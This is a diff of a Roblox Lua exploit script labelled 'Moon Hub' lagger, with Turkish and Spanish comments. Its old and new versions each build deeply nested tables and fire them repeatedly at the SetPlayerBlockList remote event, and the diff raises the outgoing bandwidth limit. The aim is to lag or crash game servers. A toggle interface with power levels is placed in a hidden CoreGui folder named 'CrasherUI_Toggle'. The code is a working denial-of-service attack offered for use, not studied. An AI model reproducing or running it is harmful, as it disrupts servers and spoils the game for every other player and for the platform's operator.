@@ -8,18 +8,17 @@ local HttpService = game:GetService("HttpService")
 
 -- // 2 (Player + Config) //
 local player = Players.LocalPlayer
-local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
 local ConfigFile = "moonhublagger.json"
 
 -- Varsayılan Ayarlar (İlk açılışta tuş yok ve MID seçili)
 local boundKey = nil
 local nivelActual = "MID"
 
--- // 3 (Lagger Güç Ayarları — Mobil ve PC için optimize edildi) //
+-- // 3 (Yeni Koddan Alınan Güç Ayarları) //
 local NIVELES = {
-	LOW  = { TableIncrease = isMobile and 150 or 200, LoopWaitTime = 0.4 },
-	MID  = { TableIncrease = isMobile and 240 or 265, LoopWaitTime = 0.15 },
-	HIGH = { TableIncrease = isMobile and 290 or 320, LoopWaitTime = 0.05 }
+	LOW  = { poder = 25 },
+	MID  = { poder = 32 },
+	HIGH = { poder = 70 }
 }
 
 -- Config Kaydetme ve Yükleme fonksiyonları
@@ -46,77 +45,40 @@ local function LoadConfig()
 end
 LoadConfig()
 
-local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
-
--- // 4 (Remote resolver) //
-local function resolveRemote(path)
-	if not path or path == "" then return nil end
-	local obj = game
-	local cleaned = path:gsub("^game%.", "")
-	for segment in cleaned:gmatch("[^%.]+") do
-		if obj then
-			obj = obj[segment]
-		else
-			return nil
-		end
+-- // 4 (Yeni Koddan Alınan Bomb / Lagger Özelliği) //
+local function bomb(poder)
+	local main, spam = {}, {{}}
+	local z = spam[1]
+	for i = 1, 25 do 
+		local t = {} 
+		table.insert(z, t) 
+		z = t 
 	end
-	return obj
+	local max = math.min(12000, poder * 50)
+	for i = 1, max do 
+		table.insert(main, spam) 
+	end
+	pcall(function() 
+		game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) 
+	end)
 end
 
--- // 5 (Bomb builder) //
-local function getmaxvalue(val)
-	local mainvalueifonetable = 499999
-	if type(val) ~= "number" then return nil end
-	return mainvalueifonetable / (val + 2)
-end
-
-local function bomb(tableincrease)
-	local maintable = {}
-	local spammedtable = {}
-	table.insert(spammedtable, {})
-	local z = spammedtable[1]
-	for i = 1, tableincrease do
-		local tableins = {}
-		table.insert(z, tableins)
-		z = tableins
-	end
-	local maximum = getmaxvalue(tableincrease) or 9999999
-	for i = 1, maximum do
-		table.insert(maintable, spammedtable)
-		if i % 5000 == 0 then task.wait() end
-	end
-	local remote = resolveRemote(CUSTOM_REMOTE_PATH)
-	if remote then
-		pcall(function()
-			if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
-				remote:FireServer(maintable)
-			elseif remote:IsA("RemoteFunction") then
-				remote:InvokeServer(maintable)
-			end
-		end)
-	end
-end
-
--- // 6 (Lagger state + control) //
+-- // 5 (Lagger State + Control) //
 local laggerEnabled = false
 local laggerThread = nil
 
 local function startLaggerLoop()
 	while laggerEnabled do
-		pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
-		task.spawn(function()
-			local config = NIVELES[nivelActual]
-			bomb(config.TableIncrease)
-		end)
-		local config = NIVELES[nivelActual]
-		task.wait(math.max(config.LoopWaitTime, 0.05))
+		pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
+		bomb(NIVELES[nivelActual].poder)
+		task.wait(0.18)
 	end
 end
 
 local function stopLaggerLoop()
 	laggerEnabled = false
 	if laggerThread then
-		pcall(function() coroutine.close(laggerThread) end)
+		task.cancel(laggerThread)
 		laggerThread = nil
 	end
 end
@@ -124,11 +86,10 @@ end
 local function startLagger()
 	if laggerThread then return end
 	laggerEnabled = true
-	laggerThread = coroutine.create(startLaggerLoop)
-	coroutine.resume(laggerThread)
+	laggerThread = task.spawn(startLaggerLoop)
 end
 
--- // 7 (Performance Strip) //
+-- // 6 (Performance Strip) //
 for _, v in pairs(workspace:GetDescendants()) do
 	if v:IsA("Texture") or v:IsA("Decal") then
 		v:Destroy()
@@ -137,7 +98,7 @@ for _, v in pairs(workspace:GetDescendants()) do
 	end
 end
 
--- // 8 (HiddenUI management) //
+-- // 7 (HiddenUI management) //
 if not CoreGui:FindFirstChild("HiddenUI") then
 	local f = Instance.new("Folder")
 	f.Name = "HiddenUI"
@@ -147,13 +108,13 @@ if CoreGui.HiddenUI:FindFirstChild("CrasherUI_Toggle") then
 	CoreGui.HiddenUI.CrasherUI_Toggle:Destroy()
 end
 
--- // 9 (ScreenGui) //
+-- // 8 (ScreenGui) //
 local gui = Instance.new("ScreenGui")
 gui.Name = "CrasherUI_Toggle"
 gui.ResetOnSpawn = false
 gui.Parent = CoreGui.HiddenUI
 
--- // 10 (Mavi/Beyaz Animasyonlu Çizgi Efekti Fonksiyonu) //
+-- // 9 (Mavi/Beyaz Animasyonlu Çizgi Efekti Fonksiyonu) //
 local function createAnimatedStroke(parent, thickness, speed)
 	local s = Instance.new("UIStroke")
 	s.Thickness = thickness or 1.5
@@ -183,7 +144,7 @@ local function createAnimatedStroke(parent, thickness, speed)
 	return s, g
 end
 
--- // 11 (Main Frame — Koyu Gece Mavisi Tema) //
+-- // 10 (Main Frame — Koyu Gece Mavisi Tema) //
 local main = Instance.new("Frame")
 main.Size = UDim2.new(0, 220, 0, 175)
 main.Position = UDim2.new(0.5, -110, 0.5, -87)
@@ -199,7 +160,7 @@ mainCorner.Parent = main
 
 createAnimatedStroke(main, 2, 0.8)
 
--- // 13 (Başlık — Moon Hub) //
+-- // 11 (Başlık — Moon Hub) //
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, -20, 0, 30)
 title.Position = UDim2.new(0, 12, 0, 6)
@@ -226,7 +187,7 @@ task.spawn(function()
 	end
 end)
 
--- // 16 (Lagger Satırı) //
+-- // 12 (Lagger Satırı) //
 local toggleRow = Instance.new("Frame")
 toggleRow.Size = UDim2.new(1, -20, 0, 34)
 toggleRow.Position = UDim2.new(0, 10, 0, 42)
@@ -247,7 +208,7 @@ toggleLabel.TextColor3 = Color3.new(1, 1, 1)
 toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
 toggleLabel.Parent = toggleRow
 
--- // 17 (Açma/Kapama Switch) //
+-- // 13 (Açma/Kapama Switch) //
 local switchBg = Instance.new("Frame")
 switchBg.Size = UDim2.new(0, 36, 0, 18)
 switchBg.Position = UDim2.new(1, -46, 0.5, -9)
@@ -289,7 +250,7 @@ toggleBtn.MouseButton1Click:Connect(function()
 	setToggle(not laggerEnabled)
 end)
 
--- // 19 (Keybind Satırı) //
+-- // 14 (Keybind Satırı) //
 local kbRow = Instance.new("Frame")
 kbRow.Size = UDim2.new(1, -20, 0, 34)
 kbRow.Position = UDim2.new(0, 10, 0, 82)
@@ -310,7 +271,7 @@ kbLabel.TextColor3 = Color3.new(1, 1, 1)
 kbLabel.TextXAlignment = Enum.TextXAlignment.Left
 kbLabel.Parent = kbRow
 
--- // 20 (Keybind Butonu) //
+-- // 15 (Keybind Butonu) //
 local kbBtn = Instance.new("TextButton")
 kbBtn.Size = UDim2.new(0, 65, 0, 22)
 kbBtn.Position = UDim2.new(1, -73, 0.5, -11)
@@ -325,7 +286,7 @@ kbBtn.Parent = kbRow
 Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 5)
 createAnimatedStroke(kbBtn, 1.2, 1.2)
 
--- // 21 (Keybind Dinleyici) //
+-- // 16 (Keybind Dinleyici) //
 local listeningForKey = false
 
 kbBtn.MouseButton1Click:Connect(function()
@@ -349,7 +310,7 @@ UserInputService.InputBegan:Connect(function(input, gpe)
 	end
 end)
 
--- // 22 (Keybind Altındaki Mod Butonları: LOW, MID, HIGH) //
+-- // 17 (Mod Butonları: LOW, MID, HIGH) //
 local modeRow = Instance.new("Frame")
 modeRow.Size = UDim2.new(1, -20, 0, 34)
 modeRow.Position = UDim2.new(0, 10, 0, 124)
@@ -402,8 +363,7 @@ createModeButton("MID", 2)
 createModeButton("HIGH", 3)
 updateModeButtons()
 
--- // 23 (Tamamen Güvenli ve Akıcı Sürükleme Sistemi) //
-local UserInputService = game:GetService("UserInputService")
+-- // 18 (Akıcı ve Sınırsız Sürükleme Sistemi) //
 local dragging, dragInput, dragStart, startPos
 
 local function update(input)
